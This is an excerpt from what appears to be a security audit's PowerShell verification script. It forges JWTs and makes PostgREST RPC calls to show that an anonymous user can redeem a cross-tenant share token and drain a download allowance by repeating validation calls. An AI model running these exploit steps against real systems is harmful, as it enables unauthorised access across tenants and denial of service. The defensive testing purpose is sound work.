# Executed attacks for findings 2, 3 and 4, over real HTTP against real
# PostgREST, with real HS256 JWTs.
#
...
function New-Jwt {
  ...
  $payload = @{ sub = $Sub; role = $Role; email = $Email; aud = 'authenticated'; exp = $exp } |
...
# anon uses a JWT whose role claim is anon - exactly the publishable key.
...
$redeemed = $false
if ($token) {
  $r = Invoke-Rest -Path '/rpc/validate_share_link' -Token $TOK_ANON -Method POST -Body @{ p_token = $token }
  $redeemed = ($r.Status -eq 200 -and $r.Body -match '"is_valid"\s*:\s*true')
  Report -Id 'F3b' -What 'anon redeems that cross-tenant token (require_auth=true ignored)' `
         -Breached $redeemed -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

  # The allowance is spent by validating, not by downloading.
  $before = $null; $spent = 0
  for ($i = 0; $i -lt 12; $i++) {
    $rr = Invoke-Rest -Path '/rpc/validate_share_link' -Token $TOK_ANON -Method POST -Body @{ p_token = $token }
  ...
  Report -Id 'F3c' -What 'anon exhausts a 10-download allowance without downloading anything' `
         -Breached ($spent -gt 0) -Evidence ("limit hit after {0} further validate calls" -f $spent)
} else {
  Report -Id 'F3b' -What 'anon redeems that cross-tenant token (require_auth=true ignored)' -Breached $false -Evidence 'no token was minted'
  Report -Id 'F3c' -What 'anon exhausts a 10-download allowance without downloading anything' -Breached $false -Evidence 'no token was minted'
}
...
$mustBreachIds = @('F2a','F2b','F3a','F3b','F3c','F4a','F4a2','F4b','F4c','F4d','F4e','F5a')
